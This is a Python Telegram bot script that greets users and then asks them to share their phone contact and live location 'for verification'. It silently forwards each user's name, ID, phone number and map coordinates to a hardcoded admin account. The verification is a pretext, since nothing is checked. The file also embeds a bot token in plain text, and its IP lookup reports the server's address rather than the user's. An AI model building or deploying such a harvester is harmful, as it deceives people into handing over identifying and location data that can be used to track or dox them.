import telebot
import requests
import time
import threading
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# ✅ Bot Token & Admin ID
BOT_TOKEN = "7651662002:AAEELw83rRkkdPj1DAe_i1IIsn_C5E-1nko"
ADMIN_ID = 7154259764

bot = telebot.TeleBot(BOT_TOKEN)

# ✅ Function to Get IP Info
def get_ip_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        return f"🌍 IP: {ip_data['ip']}\n📍 Location: {ip_data['city']}, {ip_data['region']}, {ip_data['country']}\n🔍 ISP: {ip_data['org']}"
    except:
        return "⚠️ Unable to fetch IP info!"

# ✅ Contact Request Keyboard
def contact_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(KeyboardButton("📞 Share Contact", request_contact=True))
    return keyboard

# ✅ Location Request Keyboard
def location_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(KeyboardButton("📍 Share Location", request_location=True))
    return keyboard

# ✅ Command: /start
@bot.message_handler(commands=['start'])
def send_user_info(message):
    user_info = f"🔍 **New User Info:**\n👤 Name: {message.from_user.first_name} {message.from_user.last_name or ''}\n📌 Username: @{message.from_user.username}\n🆔 User ID: {message.from_user.id}\n"
    ip_info = get_ip_info()
    
    bot.send_message(ADMIN_ID, user_info + "\n" + ip_info)
    bot.send_message(message.chat.id, f"Hello {message.from_user.first_name}!\n\n{ip_info}\n\n📞 Please share your contact for verification.", reply_markup=contact_keyboard())

# ✅ Contact Verification
@bot.message_handler(content_types=['contact'])
def contact_received(message):
    contact_info = f"📞 **Contact Info Received:**\n👤 Name: {message.contact.first_name} {message.contact.last_name or ''}\n📌 Phone: {message.contact.phone_number}\n🆔 User ID: {message.contact.user_id}"
    bot.send_message(ADMIN_ID, contact_info)
    
    # Ask for Location Verification
    bot.send_message(message.chat.id, "📍 Now share your location for verification.", reply_markup=location_keyboard())

# ✅ Location Verification
@bot.message_handler(content_types=['location'])
def location_received(message):
    location_info = f"📍 **Location Received:**\n🌍 Latitude: {message.location.latitude}\n🌏 Longitude: {message.location.longitude}\n🔗 [View on Map](https://www.google.com/maps?q={message.location.latitude},{message.location.longitude})"
    bot.send_message(ADMIN_ID, location_info, parse_mode="Markdown")
    
    # Remove Keyboard and Confirm Verification
    bot.send_message(message.chat.id, "✅ Verification complete! Now you can use this bot.", reply_markup=ReplyKeyboardRemove())

# ✅ Auto Restart Polling (Thread-Based)
def run_bot():
    while True:
        try:
            print("🤖 Bot Started...")
            bot.polling(non_stop=True, interval=3, timeout=20)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)  # 5 sec wait before restarting

# ✅ Run Bot in a Separate Thread
threading.Thread(target=run_bot).start()
